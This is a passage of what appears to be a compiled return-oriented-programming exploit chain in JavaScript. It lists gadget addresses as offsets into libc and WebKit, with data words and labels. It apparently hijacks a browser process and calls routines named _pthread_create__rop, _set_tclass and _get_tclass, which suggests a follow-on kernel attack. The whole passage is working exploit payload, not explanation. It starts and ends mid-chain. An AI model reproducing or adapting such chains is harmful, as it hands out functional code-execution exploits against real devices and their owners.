db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+768796
]);
//L3657:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+740138,//mov rax,r8
libc_base+713278,
ropchain+228760,//L3659
webkit_base+4687784,
libc_base+713278
]);
//L3658:
db([4294966272,4294967295]);// -0x400
set_gadget(libc_base+768796,);
//L3659:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+228840,//L3661
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L3661:
db([0,0]);
set_gadgets([
libc_base+430587,
libc_base+713278,
ropchain+228896,//L3663
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L3663:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+228992,//L3665
webkit_base+4687784,
libc_base+768796
]);
//L3664:
db([128,0]);// 0x80
set_gadget(webkit_base+3789839,);//pop r11
//L3665:
db([0,0]);
set_gadget(libc_base+772328,);
//L3666:
db([4,0]);// 0x4
set_gadgets([
webkit_base+1537212,//imul rax,rcx
libc_base+713278,
ropchain+229088,//L3667
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+229104,//L3668
webkit_base+4687784,
libc_base+772328
]);
//L3667:
db([0,0]);
set_gadget(libc_base+768796,);
//L3668:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+764700,//add rax,rcx
libc_base+713278,
ropchain+229192,//L3670
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L3670:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+229248,//L3672
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L3672:
db([0,0]);
set_gadget(libc_base+713278,);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+768796,
//L3674:
ropchain+229376,//L3673
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+489696,//pop rsp
ropchain+148944,//_pthread_create__rop
//L3673:
libc_base+863109,//mov rax,rcx
libc_base+713278
]);
db([4294967264,4294967295]);// -0x20
set_gadgets([
libc_base+207036,
//L3675:
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L3676:
db([4294966268,4294967295]);// -0x404
set_gadget(libc_base+772328,);
//L3678:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+229504,//L3680
webkit_base+4687784,
libc_base+772328
]);
//L3679:
db([0,0]);
set_gadget(libc_base+768796,);
//L3680:
db([0,0]);
set_gadgets([
webkit_base+972324,//mov [rax],ecx
libc_base+713278,
ropchain+229560,//L3683
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L3683:
db([0,0]);
//L3681:
set_gadgets([
libc_base+713278,
ropchain+229624,//L3686
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L3684:
db([4294966268,4294967295]);// -0x404
set_gadget(libc_base+772328,);
//L3686:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+229712,//L3688
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+229728,//L3689
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L3688:
db([0,0]);
set_gadget(libc_base+772328,);
//L3689:
db([0,0]);
set_gadgets([
libc_base+149873,//mov eax,[rdi]
libc_base+713278,
ropchain+229888,//L3691
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+229920,//L3693
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+229872,//L3690
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+229904,//L3692
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L3690:
db([0,0]);
set_gadget(libc_base+165442,);
//L3691:
db([0,0]);
set_gadget(libc_base+772328,);
//L3692:
db([0,0]);
set_gadget(libc_base+768796,);
//L3693:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+230000,//L3694
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+230016,//L3695
webkit_base+4687784,
libc_base+165442
]);
//L3694:
db([0,0]);
set_gadget(libc_base+768796,);
//L3695:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+230112,//L3697
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+230096,//L3696
webkit_base+4687784,
libc_base+165442
]);
//L3696:
db([0,0]);
set_gadget(libc_base+768796,);
//L3697:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+230208,//L3699
webkit_base+4687784,
libc_base+768796
]);
//L3698:
db([32,0]);// 0x20
set_gadget(webkit_base+3789839,);//pop r11
//L3699:
db([0,0]);
set_gadget(libc_base+165442,);
//L3700:
db([32,0]);// 0x20
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+230352,//L3702
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+230368,//L3703
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+230336,//L3701
webkit_base+4687784,
libc_base+165442
]);
//L3701:
db([0,0]);
set_gadget(libc_base+772328,);
//L3702:
db([0,0]);
set_gadget(libc_base+768796,);
//L3703:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
webkit_base+15055763,//cmp rax,rcx ;sete al
webkit_base+47019,//setl al
libc_base+232261,//movzx eax,al
libc_base+713278,
ropchain+230544,//L3705
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+230560,//L3706
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+230528,//L3704
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L3704:
db([0,0]);
set_gadget(libc_base+165442,);
//L3705:
db([0,0]);
set_gadget(libc_base+768796,);
//L3706:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+230688,//L3709
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+230720,//L3711
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+230704,//L3710
webkit_base+4687784,
libc_base+713278
]);
//L3708:
db([0,0]);
set_gadget(webkit_base+3789839,);//pop r11
//L3709:
db([0,0]);
set_gadget(libc_base+165442,);
//L3710:
db([0,0]);
set_gadget(libc_base+768796,);
//L3711:
db([0,0]);
set_gadgets([
webkit_base+11809960,//cmp rax,rsi ;sete al
libc_base+232261,//movzx eax,al
webkit_base+426067,//shl rax,3
libc_base+713278,
ropchain+230832,//L3712+8
libc_base+507828,//add rax,rsi
libc_base+145226,//mov rax,[rax]
libc_base+713278,
ropchain+230824,//L3712
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+489696 //pop rsp
]);
//L3712:
db([0,0]);
set_gadgets([
ropchain+230848,//L3712+24
ropchain+230864,//L3707
libc_base+489696,//pop rsp
ropchain+230880,//L3713
//L3707:
libc_base+489696,//pop rsp
ropchain+233824,//L3714
//L3713:
libc_base+768796
]);
//L3715:
db([65,0]);// 0x41
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278,
ropchain+230984,//L3718
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L3716:
db([16,0]);// 0x10
set_gadget(libc_base+772328,);
//L3718:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+231072,//L3720
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+231088,//L3721
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L3720:
db([0,0]);
set_gadget(libc_base+772328,);
//L3721:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+231232,//L3724
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+231248,//L3725
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+231216,//L3723
webkit_base+4687784,
libc_base+713278
]);
//L3722:
db([24,0]);// 0x18
set_gadget(libc_base+165442,);
//L3723:
db([0,0]);
set_gadget(libc_base+772328,);
//L3724:
db([0,0]);
set_gadget(libc_base+768796,);
//L3725:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+231336,//L3727
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+231352,//L3728
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L3727:
db([0,0]);
set_gadget(libc_base+772328,);
//L3728:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+231496,//L3731
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+231464,//L3729
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+231480,//L3730
webkit_base+4687784,
libc_base+165442
]);
//L3729:
db([0,0]);
set_gadget(libc_base+772328,);
//L3730:
db([0,0]);
set_gadget(libc_base+768796,);
//L3731:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+231568,//L3733
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L3733:
db([0,0]);
set_gadgets([
libc_base+430587,
libc_base+713278,
ropchain+231624,//L3735
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L3735:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278,
ropchain+231720,//L3738
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L3736:
db([4294966268,4294967295]);// -0x404
set_gadget(libc_base+772328,);
//L3738:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+231808,//L3740
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+231824,//L3741
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L3740:
db([0,0]);
set_gadget(libc_base+772328,);
//L3741:
db([0,0]);
set_gadgets([
libc_base+149873,//mov eax,[rdi]
libc_base+713278,
ropchain+231984,//L3743
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+232016,//L3745
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+231968,//L3742
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+232000,//L3744
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L3742:
db([0,0]);
set_gadget(libc_base+165442,);
//L3743:
db([0,0]);
set_gadget(libc_base+772328,);
//L3744:
db([0,0]);
set_gadget(libc_base+768796,);
//L3745:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+232176,//L3749
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+232128,//L3746
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+232144,//L3747
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L3746:
db([0,0]);
set_gadget(libc_base+165442,);
//L3747:
db([0,0]);
set_gadget(libc_base+772328,);
//L3748:
db([4,0]);// 0x4
set_gadget(libc_base+768796,);
//L3749:
db([0,0]);
set_gadgets([
webkit_base+1537212,//imul rax,rcx
libc_base+713278,
ropchain+232256,//L3750
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+232272,//L3751
webkit_base+4687784,
libc_base+772328
]);
//L3750:
db([0,0]);
set_gadget(libc_base+768796,);
//L3751:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+764700,//add rax,rcx
libc_base+713278,
ropchain+232360,//L3753
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L3753:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+232416,//L3755
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L3755:
db([0,0]);
set_gadget(libc_base+713278,);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+232544,//L3756
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+232576,//L3758
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+232560,//L3757
webkit_base+4687784,
libc_base+165442
]);
//L3756:
db([0,0]);
set_gadget(libc_base+772328,);
//L3757:
db([0,0]);
set_gadget(libc_base+768796,);
//L3758:
db([0,0]);
set_gadgets([
libc_base+149873,//mov eax,[rdi]
libc_base+713278,
ropchain+232736,//L3760
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+232768,//L3762
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+232720,//L3759
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+232752,//L3761
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L3759:
db([0,0]);
set_gadget(libc_base+165442,);
//L3760:
db([0,0]);
set_gadget(libc_base+772328,);
//L3761:
db([0,0]);
set_gadget(libc_base+768796,);
//L3762:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+232848,//L3763
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+232864,//L3764
webkit_base+4687784,
libc_base+165442
]);
//L3763:
db([0,0]);
set_gadget(libc_base+768796,);
//L3764:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+232960,//L3766
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+232944,//L3765
webkit_base+4687784,
libc_base+165442
]);
//L3765:
db([0,0]);
set_gadget(libc_base+768796,);
//L3766:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+768796,
//L3768:
ropchain+233064,//L3767
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+489696,//pop rsp
ropchain+187456,//_set_tclass
//L3767:
libc_base+863109,//mov rax,rcx
libc_base+713278
]);
db([4294967280,4294967295]);// -0x10
set_gadgets([
libc_base+207036,
//L3769:
libc_base+713278,
ropchain+233152,//L3772
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L3770:
db([4294966268,4294967295]);// -0x404
set_gadget(libc_base+772328,);
//L3772:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+233240,//L3774
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+233256,//L3775
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L3774:
db([0,0]);
set_gadget(libc_base+772328,);
//L3775:
db([0,0]);
set_gadgets([
libc_base+149873,//mov eax,[rdi]
libc_base+713278,
ropchain+233416,//L3777
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+233448,//L3779
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+233400,//L3776
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+233432,//L3778
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L3776:
db([0,0]);
set_gadget(libc_base+165442,);
//L3777:
db([0,0]);
set_gadget(libc_base+772328,);
//L3778:
db([0,0]);
set_gadget(libc_base+768796,);
//L3779:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+233544,//L3781
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+233528,//L3780
webkit_base+4687784,
libc_base+165442
]);
//L3780:
db([0,0]);
set_gadget(libc_base+768796,);
//L3781:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278,
ropchain+233632,//L3783
webkit_base+4687784,
libc_base+713278
]);
//L3782:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L3783:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+233704,//L3786
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L3784:
db([4294966268,4294967295]);// -0x404
set_gadget(libc_base+772328,);
//L3786:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+972324,//mov [rax],ecx
libc_base+713278,
ropchain+233768,//L3788
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L3788:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+489696,//pop rsp
ropchain+229568,//L3681
//L3714:
libc_base+713278,
ropchain+233880,//L3791
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L3789:
db([16,0]);// 0x10
set_gadget(libc_base+772328,);
//L3791:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+233968,//L3793
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+233984,//L3794
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L3793:
db([0,0]);
set_gadget(libc_base+772328,);
//L3794:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+234128,//L3797
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+234144,//L3798
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+234112,//L3796
webkit_base+4687784,
libc_base+713278
]);
//L3795:
db([16,0]);// 0x10
set_gadget(libc_base+165442,);
//L3796:
db([0,0]);
set_gadget(libc_base+772328,);
//L3797:
db([0,0]);
set_gadget(libc_base+768796,);
//L3798:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+234232,//L3800
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+234248,//L3801
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L3800:
db([0,0]);
set_gadget(libc_base+772328,);
//L3801:
db([0,0]);
set_gadgets([
libc_base+149873,//mov eax,[rdi]
libc_base+713278,
ropchain+234408,//L3803
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+234440,//L3805
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+234392,//L3802
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+234424,//L3804
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L3802:
db([0,0]);
set_gadget(libc_base+165442,);
//L3803:
db([0,0]);
set_gadget(libc_base+772328,);
//L3804:
db([0,0]);
set_gadget(libc_base+768796,);
//L3805:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+234536,//L3807
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+234520,//L3806
webkit_base+4687784,
libc_base+165442
]);
//L3806:
db([0,0]);
set_gadget(libc_base+768796,);
//L3807:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+768796,
//L3809:
ropchain+234640,//L3808
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+489696,//pop rsp
ropchain+174016,//_get_tclass
//L3808:
libc_base+863109,//mov rax,rcx
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+234784,//L3811
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+234800,//L3812
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+234768,//L3810
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L3810:
db([0,0]);
set_gadget(libc_base+165442,);
//L3811:
db([0,0]);
set_gadget(libc_base+768796,);
//L3812:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+234896,//L3814
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+234880,//L3813
webkit_base+4687784,
libc_base+165442
]);
//L3813:
db([0,0]);
set_gadget(libc_base+768796,);
//L3814:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+234992,//L3816
webkit_base+4687784,
libc_base+768796
]);
//L3815:
db([65,0]);// 0x41
set_gadget(webkit_base+3789839,);//pop r11
//L3816:
db([0,0]);
set_gadget(libc_base+165442,);
//L3817:
db([65,0]);// 0x41
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+235136,//L3819
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+235152,//L3820
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+235120,//L3818
webkit_base+4687784,
libc_base+165442
]);
//L3818:
db([0,0]);
set_gadget(libc_base+772328,);
//L3819:
db([0,0]);
set_gadget(libc_base+768796,);
//L3820:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
webkit_base+15055763,//cmp rax,rcx ;sete al
libc_base+232261,//movzx eax,al
libc_base+713278,
ropchain+235320,//L3822
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+235336,//L3823
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+235304,//L3821
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L3821:
db([0,0]);
set_gadget(libc_base+165442,);
//L3822:
db([0,0]);
set_gadget(libc_base+768796,);
//L3823:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+235464,//L3826
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+235496,//L3828
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+235480,//L3827
webkit_base+4687784,
libc_base+713278
]);
//L3825:
db([0,0]);
set_gadget(webkit_base+3789839,);//pop r11
//L3826:
db([0,0]);
set_gadget(libc_base+165442,);
//L3827:
db([0,0]);
set_gadget(libc_base+768796,);
//L3828:
db([0,0]);
set_gadgets([
webkit_base+11809960,//cmp rax,rsi ;sete al
libc_base+232261,//movzx eax,al
webkit_base+426067,//shl rax,3
libc_base+713278,
ropchain+235608,//L3829+8
libc_base+507828,//add rax,rsi
libc_base+145226,//mov rax,[rax]
libc_base+713278,
ropchain+235600,//L3829
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+489696 //pop rsp
]);
//L3829:
db([0,0]);
set_gadgets([
ropchain+235624,//L3829+24
ropchain+235640,//L3824
libc_base+489696,//pop rsp
ropchain+241288,//L3830
//L3824:
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L3831:
db([4294966264,4294967295]);// -0x408
set_gadget(libc_base+772328,);
//L3833:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+235736,//L3835
webkit_base+4687784,
libc_base+772328
]);
//L3834:
db([0,0]);
set_gadget(libc_base+768796,);
//L3835:
db([0,0]);
set_gadgets([
webkit_base+972324,//mov [rax],ecx
libc_base+713278,
ropchain+235792,//L3838
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L3838:
db([0,0]);
//L3836:
set_gadgets([
libc_base+713278,
ropchain+235856,//L3841
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L3839:
db([4294966264,4294967295]);// -0x408
set_gadget(libc_base+772328,);
//L3841:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+235944,//L3843
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+235960,//L3844
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L3843:
db([0,0]);
set_gadget(libc_base+772328,);
//L3844:
db([0,0]);
set_gadgets([
libc_base+149873,//mov eax,[rdi]
libc_base+713278,
ropchain+236120,//L3846
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+236152,//L3848
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+236104,//L3845
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+236136,//L3847
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L3845:
db([0,0]);
set_gadget(libc_base+165442,);
//L3846:
db([0,0]);
set_gadget(libc_base+772328,);
//L3847:
db([0,0]);
set_gadget(libc_base+768796,);
//L3848:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+236232,//L3849
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+236248,//L3850
webkit_base+4687784,
libc_base+165442
]);
//L3849:
db([0,0]);
set_gadget(libc_base+768796,);
//L3850:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+236344,//L3852
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+236328,//L3851
webkit_base+4687784,
libc_base+165442
]);
//L3851:
db([0,0]);
set_gadget(libc_base+768796,);
//L3852:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+236440,//L3854
webkit_base+4687784,
libc_base+768796
]);
//L3853:
db([32,0]);// 0x20
set_gadget(webkit_base+3789839,);//pop r11
//L3854:
db([0,0]);
set_gadget(libc_base+165442,);
//L3855:
db([32,0]);// 0x20
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+236584,//L3857
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+236600,//L3858
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+236568,//L3856
webkit_base+4687784,
libc_base+165442
]);
//L3856:
db([0,0]);
set_gadget(libc_base+772328,);
//L3857:
db([0,0]);
set_gadget(libc_base+768796,);
//L3858:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
webkit_base+15055763,//cmp rax,rcx ;sete al
webkit_base+47019,//setl al
libc_base+232261,//movzx eax,al
libc_base+713278,
ropchain+236776,//L3860
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+236792,//L3861
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+236760,//L3859
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L3859:
db([0,0]);
set_gadget(libc_base+165442,);
//L3860:
db([0,0]);
set_gadget(libc_base+768796,);
//L3861:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+236920,//L3864
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+236952,//L3866
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+236936,//L3865
webkit_base+4687784,
libc_base+713278
]);
//L3863:
db([0,0]);
set_gadget(webkit_base+3789839,);//pop r11
//L3864:
db([0,0]);
set_gadget(libc_base+165442,);
//L3865:
db([0,0]);
set_gadget(libc_base+768796,);
//L3866:
db([0,0]);
set_gadgets([
webkit_base+11809960,//cmp rax,rsi ;sete al
libc_base+232261,//movzx eax,al
webkit_base+426067,//shl rax,3
libc_base+713278,
ropchain+237064,//L3867+8
libc_base+507828,//add rax,rsi
libc_base+145226,//mov rax,[rax]
libc_base+713278,
ropchain+237056,//L3867
